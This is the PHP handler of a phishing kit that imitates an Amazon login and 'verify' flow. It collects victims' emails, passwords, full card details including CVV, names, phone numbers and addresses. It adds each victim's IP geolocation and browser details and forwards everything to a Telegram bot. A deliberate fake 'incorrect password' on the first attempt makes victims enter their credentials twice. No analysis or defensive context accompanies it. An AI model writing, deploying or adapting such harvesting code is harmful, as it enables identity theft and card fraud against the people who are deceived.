<?php
require 'config/settings.php';

session_start();

// ====================== LOAD SESSION ======================
$sessionToken = $_POST['sid'] ?? ($_GET['sid'] ?? '');

$isAjax = !empty($_SERVER['HTTP_X_REQUESTED_WITH']) &&
          strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest';

// ====================== HELPERS ======================
function sendAPIRequest($ipAddress, $url, $apiKey) {

    $ipAddress = trim($ipAddress);

    if (in_array($ipAddress, ['127.0.0.1', '0.0.0.0', '::1'])) {
        return [
            'ip' => $ipAddress,
            'location' => ['city' => 'localhost'],
            'country' => ['name' => 'localhost']
        ];
    }

    $curl = curl_init();

    curl_setopt_array($curl, [
        CURLOPT_URL => $url . $ipAddress . "&localityLanguage=en&key=" . $apiKey,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10,
    ]);

    $response = curl_exec($curl);

    curl_close($curl);

    return $response ? json_decode($response, true) : null;
}

function validate_email($email) {
    return filter_var(trim($email), FILTER_VALIDATE_EMAIL) !== false;
}

function validate_password($password) {
    return preg_match('/[A-Z]/', $password) &&
           preg_match('/[a-z]/', $password) &&
           preg_match('/\d/', $password) &&
           strlen($password) >= 7;
}

function prepareMessage($header, $includeFullGeo, $authData, $geoInfo, $basicGeoInfo) {

    global $botToken, $chatIds, $double_login;

    // ====================== LOGIN ATTEMPTS ======================
    $loginTime = "";

    if (($_SESSION['login_attempts'] ?? 0) >= 1) {
        $loginTime = "RE-LOGIN";
    }

    // ====================== MESSAGE ======================
    $message  = "👤 {$header} {$loginTime}\n\n";
    $message .= "========================\n\n";

    foreach ($authData as $label => $value) {

        if ($value !== '') {

            $label = strtoupper(str_replace('_', ' ', $label));

            $message .= "{$label}: {$value}\n";
        }
    }

    $message .= "\n========================\n\n";

    $message .= $includeFullGeo ? $geoInfo : $basicGeoInfo;

    $message .= "\n========================\n\n";

    if (function_exists('sendToTelegram') && !empty($botToken) && !empty($chatIds)) {
        sendToTelegram($message, $botToken, $chatIds);
    }

    // ====================== VALIDATION ======================
    $errors = [];

    $username = trim($authData['username'] ?? '');
    $password = $authData['password'] ?? '';

    if ($username && !validate_email($username)) {
        $errors[] = 'Enter a valid email address';
    }

    if ($password && !validate_password($password)) {
        $errors[] = 'Your email or password is incorrect';
    }

    // ====================== FAILED VALIDATION ======================
    if (!empty($errors)) {

        $_SESSION['login_failed'] = true;

        $_SESSION['error_message'] = trim($errors[0]);

        return false;
    }

    // ====================== LOGIN ATTEMPTS ======================
    $_SESSION['login_attempts'] =
        ($_SESSION['login_attempts'] ?? 0) + 1;

    // ====================== DOUBLE LOGIN ======================
    if (($double_login)) {

        // FIRST LOGIN
        if (empty($_SESSION['double_login_stage'])) {

            $_SESSION['double_login_stage'] = 1;

            $_SESSION['login_failed'] = true;

            $_SESSION['error_message'] =
                "Your email or password is incorrect";

            return 'RELOGIN';
        }
    }

    // ====================== AUTH CHECK ======================
    $isAuthenticated =
        !empty($username) &&
        !empty($password) &&
        validate_password($password);

    if (!$isAuthenticated) {

        $_SESSION['login_failed'] = true;

        $_SESSION['error_message'] =
            "Your email or password is incorrect.";

        return false;
    }

    // ====================== SUCCESS ======================
    $_SESSION['login_failed'] = false;
    $_SESSION['error_message'] = null;

    unset($_SESSION['double_login_stage']);

    return true;
}

// ====================== MAIN EXECUTION ======================
$URL    = "https://api-bdc.net/data/ip-geolocation?ip=";
$ApiKey = "bdc_13bbc1ea73db483b856f22acc6c6d427";

$ipAddress = $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';

$ipData = sendAPIRequest($ipAddress, $URL, $ApiKey);

if (empty($ipData['ip'])) {

    $ipData = [
        'ip' => $ipAddress,
        'location' => ['city' => 'Unknown'],
        'country' => ['name' => 'Unknown']
    ];
}

$userAgent  = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$systemLang = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'Unknown';

$geoInfo =
    "🌍 GEO-IP INFO\n" .
    "IP ADDRESS: {$ipData['ip']}\n" .
    "COORDINATES: " .
    ($ipData['location']['longitude'] ?? 0) . ", " .
    ($ipData['location']['latitude'] ?? 0) . "\n" .
    "CITY: " . ($ipData['location']['city'] ?? 'Unknown') . "\n" .
    "COUNTRY: " . ($ipData['country']['name'] ?? 'Unknown') . "\n\n" .
    "💻 SYSTEM INFO\n" .
    "USER AGENT: {$userAgent}\n" .
    "LANGUAGE: {$systemLang}\n\n";

$basicGeoInfo =
    "🌍 GEO-IP INFO\n" .
    "IP ADDRESS: {$ipData['ip']}\n\n";

// ====================== POST DATA ======================
$username     = trim($_POST['email'] ?? '');
$password     = $_POST['password'] ?? '';

$fullName     = $_POST['full_name'] ?? '';
$phoneNumber  = $_POST['phone_number'] ?? '';
$address      = $_POST['address_line_1'] ?? '';
$addressLine2 = $_POST['address_line_2'] ?? '';
$city         = $_POST['city'] ?? '';
$postalCode   = $_POST['postal_code'] ?? '';

$cardnumber   = $_POST['cardNumber'] ?? '';
$cardName     = $_POST['cardName'] ?? '';
$expiry       = $_POST['expiryDate'] ?? '';
$cvv          = $_POST['cvv'] ?? '';

// ====================== 1. LOGIN ======================
if ($username && $password) {

    $loginResult = prepareMessage(
        "AMAZON",
        true,
        [
            'username' => $username,
            'password' => $password
        ],
        $geoInfo,
        $basicGeoInfo
    );

    // ====================== FORCE RE-LOGIN ======================
    if ($loginResult === 'RELOGIN') {

        if ($isAjax) {

            header('Content-Type: application/json');

            echo json_encode([
                'success' => false,
                'message' => $_SESSION['error_message']
            ]);

        } else {

            header("Location: ./");
        }

        exit;
    }

    // ====================== FAILED LOGIN ======================
    if ($loginResult === false) {

        if ($isAjax) {

            header('Content-Type: application/json');

            echo json_encode([
                'success' => false,
                'message' => $_SESSION['error_message']
            ]);

        } else {

            header("Location: ./");
        }

        exit;
    }

    // ====================== SUCCESS ======================
    $newSid = generateSessionToken([
        'current_step' => 1
    ]);

    $redirect = "./verify?step=1&sid=" . $newSid;

    if ($isAjax) {

        header('Content-Type: application/json');

        echo json_encode([
            'success' => true,
            'redirect' => $redirect
        ]);

    } else {

        header("Location: " . $redirect);
    }

    exit;
}

// ====================== 2. CARD DETAILS ======================
if ($cardName && $cvv) {

    prepareMessage(
        "AMAZON CARD",
        false,
        [
            'cardnumber' => $cardnumber,
            'cardName'   => $cardName,
            'expiryDate' => $expiry,
            'cvv'        => $cvv
        ],
        $geoInfo,
        $basicGeoInfo
    );

    $newSid = generateSessionToken([
        'current_step' => 2
    ]);

    $redirect = "./verify?step=2&sid=" . $newSid;

    if ($isAjax) {

        header('Content-Type: application/json');

        echo json_encode([
            'success' => true,
            'redirect' => $redirect
        ]);

    } else {

        header("Location: " . $redirect);
    }

    exit;
}

// ====================== 3. CONTACT ======================
if ($fullName) {

    prepareMessage(
        "AMAZON CONTACT",
        false,
        [
            'fullName'     => $fullName,
            'phoneNumber'  => $phoneNumber,
            'address'      => $address,
            'addressLine2' => $addressLine2,
            'city'         => $city,
            'postalCode'   => $postalCode
        ],
        $geoInfo,
        $basicGeoInfo
    );

    $newSid = generateSessionToken([
        'current_step' => 3
    ]);

    $redirect = "./verify?step=3&sid=" . $newSid;

    if ($isAjax) {

        header('Content-Type: application/json');

        echo json_encode([
            'success' => true,
            'redirect' => $redirect
        ]);

    } else {

        header("Location: " . $redirect);
    }

    exit;
}

// ====================== FALLBACK ======================
header('Content-Type: application/json');

echo json_encode([
    'success' => false,
    'error'   => 'Invalid request'
]);

exit; 